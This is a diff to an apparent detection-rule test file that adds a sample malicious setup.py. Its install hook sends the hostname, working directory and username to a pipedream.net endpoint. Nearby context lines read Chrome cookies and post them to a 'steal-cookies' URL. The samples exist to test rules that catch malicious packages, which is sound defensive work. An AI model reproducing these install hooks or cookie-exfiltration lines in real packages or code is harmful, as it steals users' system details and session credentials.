@@ -213,3 +213,24 @@ requests.get("foo", auth=(os.environ["GH_TOKEN"], "x-oauth-basic"))
 cookies = browser_cookie3.chrome(domain_name="google.com")
 # ruleid: exfiltrate-sensitive-data
 requests.post("https://1.1.1.1/steal-cookies", data=json.dumps(cookies))
+
+""" RULEID: HTTP requests sent to pentest domains
+"""
+
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads)
+
+
+setup(name='dependency1338',
+      version='1.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
